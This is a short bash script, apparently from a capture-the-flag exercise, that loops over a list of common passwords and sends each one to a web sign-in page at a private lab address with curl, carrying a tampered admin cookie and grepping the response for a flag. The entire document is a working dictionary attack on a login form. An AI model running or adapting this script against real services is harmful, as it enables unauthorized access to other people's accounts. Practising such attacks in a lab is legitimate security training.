
passwords=("password" 123456 "passw0rd" "baseball" "football" 111111 "qwerty" "azerty" "shadow" "monkey" "dragon")
for pass in ${passwords[*]}
do
    printf "   %s\n" $pass
    curl -i\
        "http://192.168.56.101/?page=signin&username=lol&password=$pass&Login=Login#"\
        -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Connection: keep-alive' -H 'Referer: http://192.168.56.101/?page=signin' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1'\
        | grep flag
done
